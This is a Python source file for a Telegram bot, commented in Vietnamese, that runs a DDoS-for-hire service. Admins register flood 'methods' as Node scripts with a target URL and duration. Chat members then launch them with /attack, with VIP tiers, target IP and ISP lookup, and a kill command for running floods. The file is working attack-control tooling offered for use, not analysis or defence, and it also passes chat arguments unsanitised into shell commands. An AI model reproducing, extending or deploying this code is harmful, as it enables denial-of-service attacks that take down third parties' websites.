# pip install requests python-telegram-bot pytz --break-system-packages
import json,os,asyncio,socket,requests,time
from datetime import datetime
from telegram import InlineKeyboardButton,InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder,CommandHandler
from pytz import timezone
from html import escape

CONFIG_FILE,METHODS_FILE='config1.json','methods1.json'
BOT_ACTIVE,user_processes=True,{}

# Hàm load dữ liệu từ file JSON
def load_json(f):return json.load(open(f,'r'))if os.path.exists(f)else save_json(f,{})or{}

# Hàm lưu dữ liệu vào file JSON
def save_json(f,d):json.dump(d,open(f,'w'),indent=4)

# Hàm lấy thời gian hiện tại ở múi giờ Việt Nam
def get_vietnam_time():return datetime.now(timezone('Asia/Ho_Chi_Minh')).strftime('%Y-%m-%d %H:%M:%S')

# Hàm lấy địa chỉ IP và thông tin ISP từ URL
def get_ip_and_isp(url):
    try:
        ip=socket.gethostbyname(url.split('/')[2])
        r=requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,continent,country,region,city,isp,org,as,asname,reverse,query")
        return ip,r.json()if r.ok else None
    except:return None,None

# Hàm kiểm tra xem URL có hợp lệ không
def is_valid_url(url):return url.startswith("http://")or url.startswith("https://")

# Hàm khởi tạo file cấu hình nếu chưa tồn tại
def initialize_config():
    if not os.path.exists(CONFIG_FILE):save_json(CONFIG_FILE,{"token":"YOUR_TOKEN_HERE","admin_ids":[],"group_id":"YOUR_GROUP_ID_HERE","vipuserid":[]})

# Hàm kiểm tra cấu hình và trả về các giá trị cần thiết
def check_config():
    c=load_json(CONFIG_FILE)
    for k in['token','admin_ids','group_id']:
        if k not in c or(k=='admin_ids'and not c[k])or c[k]==f"YOUR_{k.upper()}_HERE":print(f"Please provide a valid {k} in {CONFIG_FILE}.");exit(1)
    return c['token'],c['admin_ids'],int(c['group_id'])

initialize_config();TOKEN,ADMIN_IDS,GROUP_ID=check_config()

# Hàm xử lý lệnh pkill để dừng các tiến trình đang chạy
async def pkill_handler(update,context):
    if not update.message or not BOT_ACTIVE or(update.message.from_user.id not in ADMIN_IDS and update.message.from_user.id not in load_json(CONFIG_FILE)['vipuserid']):return await update.message.reply_text("Bot is turned off or you do not have permission. ❌")
    killed_pids=[]
    for cmd in ["http1", "http2", "httpmix", "tlskill", "flood", "get", "browser", "superkill"]:
        proc=await asyncio.create_subprocess_shell(f"ps aux | grep '{cmd}' | grep -v grep | awk '{{print $2}}'",stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE)
        stdout,_=await proc.communicate()
        if stdout:pids=[pid for pid in stdout.decode().strip().split('\n')if pid.strip()];killed_pids.extend(pids);await asyncio.create_subprocess_shell(f"pkill -9 -f {cmd}")
    await update.message.reply_text(f"Processes terminated. PIDs:🛠 {', '.join(killed_pids)}"if killed_pids else"No processes were terminated. 🔌")

# Hàm xử lý các lệnh chung, kiểm tra điều kiện và gọi hàm xử lý tương ứng
async def command_handler(update,context,h,min_args,help_text):
    if not update.message or(not BOT_ACTIVE and update.message.from_user.id not in ADMIN_IDS)or len(context.args)<min_args:return await update.message.reply_text("Bot is turned off or invalid command usage. 🛑"if not BOT_ACTIVE else help_text)
    await h(update,context)

# Hàm thêm phương thức tấn công mới
async def add_method(update,context):
    if not update.message or update.message.from_user.id not in ADMIN_IDS or len(context.args)<2:return await update.message.reply_text("You do not have permission or invalid usage. ❌")
    m,url,attack_time=context.args[0],context.args[1],int(context.args[context.args.index('timeset')+1])if'timeset'in context.args else 60
    visibility='VIP'if'[vip]'in context.args else'MEMBER'
    command=f"node --max-old-space-size=65536 {m} {url} "+" ".join([arg for arg in context.args[2:]if arg not in['[vip]','[member]','timeset']])
    methods_data=load_json(METHODS_FILE);methods_data[m]={'command':command,'url':url,'time':attack_time,'visibility':visibility};save_json(METHODS_FILE,methods_data)
    await update.message.reply_text(f"Method {m} added with {visibility} access. ✅")

# Hàm xóa phương thức tấn công
async def delete_method(update,context):
    if not update.message or update.message.from_user.id not in ADMIN_IDS or len(context.args)<1:return await update.message.reply_text("You do not have permission or invalid usage. ❌")
    m=context.args[0];methods_data=load_json(METHODS_FILE)
    if m not in methods_data:return await update.message.reply_text(f"Method {m} not found. ❌")
    del methods_data[m];save_json(METHODS_FILE,methods_data);await update.message.reply_text(f"Method {m} deleted. 🗑")

# Hàm thực hiện tấn công bằng phương thức đã chọn
async def attack_method(update,context):
    if not update.message or update.message.chat.id!=GROUP_ID or len(context.args)<2:return await update.message.reply_text("Unauthorized chat or invalid usage.")
    uid=update.message.from_user.id
    if uid in user_processes and user_processes[uid]['process'].returncode is None:return await update.message.reply_text(f"Another process is running for ⏳ {int(user_processes[uid]['attack_time']-(time.time()-user_processes[uid]['start_time']))}s. Please wait.")
    m,url=context.args[0],context.args[1]
    if not is_valid_url(url):return await update.message.reply_text("Invalid URL. Please include http:// or https://")
    methods_data=load_json(METHODS_FILE)
    if m not in methods_data:return await update.message.reply_text("Method not found. ❌")
    method=methods_data[m]
    if method['visibility']=='VIP'and uid not in ADMIN_IDS and uid not in load_json(CONFIG_FILE)['vipuserid']:return await update.message.reply_text("🔑VIP access required🔑")
    attack_time=int(context.args[2])if len(context.args)>2 and uid in ADMIN_IDS else method['time']
    ip,isp_info=get_ip_and_isp(url)
    if not ip:return await update.message.reply_text("Unable to retrieve IP. Check the URL.")
    command=method['command'].replace(method['url'],url).replace(str(method['time']),str(attack_time))
    isp_info_text=json.dumps(isp_info,indent=2,ensure_ascii=False)if isp_info else'No ISP info.'
    await update.message.reply_text(f"🚀Attack sent 🚀: {m.upper()}.\nRequested by: {update.message.from_user.username}🎖\nWebsite IP Info:📡\n<pre>{escape(isp_info_text)}</pre>\nDuration: {attack_time}s\nStart Time: {get_vietnam_time()}",parse_mode='HTML',reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🌍 Check Status 🔎",url=f"https://check-host.net/check-http?host={url}")]]))
    st=time.time();proc=await asyncio.create_subprocess_shell(command,stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE);user_processes[uid]={'process':proc,'start_time':st,'attack_time':attack_time}
    asyncio.create_task(execute_attack(command,update,m,st,attack_time,uid))

# Hàm thực thi tấn công và xử lý kết quả
async def execute_attack(command,update,method_name,start_time,attack_time,user_id):
    try:
        process=user_processes[user_id]['process'];stdout,stderr=await process.communicate();status,error=("Completed",None)if not stderr else("Error",stderr.decode())
    except Exception as e:status,error="Error",str(e)
    elapsed_time=round(time.time()-start_time,2);attack_info={"method_name":method_name.upper(),"username":update.message.from_user.username,"start_time":datetime.fromtimestamp(start_time).strftime('%Y-%m-%d %H:%M:%S'),"end_time":datetime.now().strftime('%Y-%m-%d %H:%M:%S'),"elapsed_time":elapsed_time,"attack_status":status,"error":error or"Success"}
    user_processes.pop(user_id,None);await update.message.reply_text(f"Process finished in {elapsed_time}s.\nDetails:\n<pre>{escape(json.dumps(attack_info,indent=2,ensure_ascii=False))}</pre>",parse_mode='HTML')

# Hàm liệt kê các phương thức tấn công hiện có
async def list_methods(update,context):
    if not update.message or not BOT_ACTIVE:return await update.message.reply_text("Bot is turned off.")
    methods_data=load_json(METHODS_FILE)
    if not methods_data:return await update.message.reply_text("No available methods.")
    methods_list="\n".join([f"{name.upper()} ({data['visibility']}): {data['time']}s"for name,data in methods_data.items()]);await update.message.reply_text("Available methods:📌\n"+methods_list)

# Hàm quản lý người dùng VIP (thêm/xóa)
async def manage_vip_user(update,context,action):
    if not update.message or update.message.from_user.id not in ADMIN_IDS or len(context.args)<1:return await update.message.reply_text("🔒You do not have permission🔒")
    user_id=int(context.args[0]);config=load_json(CONFIG_FILE);vip_users=config.get('vipuserid',[])
    if action=="add"and user_id not in vip_users:vip_users.append(user_id);config['vipuserid']=vip_users;save_json(CONFIG_FILE,config);await update.message.reply_text(f"User {user_id} added to VIP. ✅")
    elif action=="remove"and user_id in vip_users:vip_users.remove(user_id);config['vipuserid']=vip_users;save_json(CONFIG_FILE,config);await update.message.reply_text(f"User {user_id} removed from VIP. ✅")
    else:await update.message.reply_text(f"User {user_id} does not exist or already set accordingly.")

# Hàm hiển thị thông tin trợ giúp
async def help_message(update,context):
    if not update.message:return
    await update.message.reply_text("OWNER: 👑@NeganSSHConsole @adam022022👑\n/attack <phương thức> <url> [thời gian]\n/methods - Danh sách phương thức\n/vipuser <uid> - Thêm VIP\n/delvip <uid> - Xóa VIP\n/on - Bật bot\n/off - Tắt bot\n/pkill - Dừng tất cả tiến trình\n\n📢 Nhóm chat: [DDOS WEB DEVTEAM 🇻🇳](https://t.me/botdevteam)",disable_web_page_preview=True)

# Hàm bật bot
async def bot_on(update,context):
    if not update.message or update.message.from_user.id not in ADMIN_IDS:return
    global BOT_ACTIVE;BOT_ACTIVE=True;await update.message.reply_text("Bot is now ON. ✅")

# Hàm tắt bot
async def bot_off(update,context):
    if not update.message or update.message.from_user.id not in ADMIN_IDS:return
    global BOT_ACTIVE;BOT_ACTIVE=False;await update.message.reply_text("Bot is now OFF. ⛔")

# Khởi tạo ứng dụng Telegram và thêm các handler
app=ApplicationBuilder().token(TOKEN).build()
app.add_handlers([
    CommandHandler("add",lambda u,c:command_handler(u,c,add_method,2,"Usage: /add <method> <url> timeset <duration> [vip/member]")),
    CommandHandler("del",lambda u,c:command_handler(u,c,delete_method,1,"Usage: /del <method>")),
    CommandHandler("attack",lambda u,c:command_handler(u,c,attack_method,2,"Usage: /attack <method> <url> [duration] 🚀")),
    CommandHandler("methods",lambda u,c:command_handler(u,c,list_methods,0,"")),
    CommandHandler("vipuser",lambda u,c:command_handler(u,c,lambda u,c:manage_vip_user(u,c,"add"),1,"Usage: /vipuser <uid>")),
    CommandHandler("delvip",lambda u,c:command_handler(u,c,lambda u,c:manage_vip_user(u,c,"remove"),1,"Usage: /delvip <uid>")),
    CommandHandler("pkill",pkill_handler),
    CommandHandler("help",help_message),
    CommandHandler("on",bot_on),
    CommandHandler("off",bot_off)
])

# Chạy bot
app.run_polling()
